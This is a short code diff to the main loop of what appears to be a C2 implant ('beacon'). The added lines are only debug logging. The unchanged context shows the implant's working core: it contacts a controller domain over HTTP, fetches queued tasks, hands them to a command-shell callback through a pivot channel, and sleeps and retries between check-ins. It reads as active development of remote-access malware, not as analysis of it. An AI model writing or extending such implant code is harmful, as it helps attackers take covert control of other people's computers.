@@ -210,6 +210,7 @@ void beacon(LPVOID lpReserved) {
 		 * full HTTP GET that drained the task queue before the UDC2
 		 * session could deliver it (live: pwd stolen by our own GET). */
 		beacon_cycles++;
+		spawn_log("loop: cycle=", (long)beacon_cycles);
 		if (beacon_cycles >= 1 && udc2_init()) {
 			post_type = POST_UDC2;
 			pivot_poll(command_shell_callback);
@@ -239,7 +240,9 @@ void beacon(LPVOID lpReserved) {
 
 		/* 执行协议的HTTP部分 */
 		// dlog("beacon.beacon - http_init: %s \n", beacon_domain);
+		spawn_log("loop: pre http_init", 0);
 		http_init(beacon_domain, port, ua);
+		spawn_log("loop: post http_init", 0);
 
 		// dlog("beacon.beacon - http_get: %s \n", url);
 		length = http_get(url, &bigsession, buffer, MAX_GET);
@@ -328,6 +331,7 @@ void beacon(LPVOID lpReserved) {
 		/* 检查最大重试策略，如果达到阈值则调整休眠时间 */
 		if (check_max_retry(failedHost, &maxRetryCount, &sleep_time, &maxOrigSleepTime))
 			safe_exit();
+		spawn_log("loop: post maxretry sleep_time=", (long)sleep_time);
 
 		/* 需要休眠多久？ */
 		if (sleep_time > 0) {
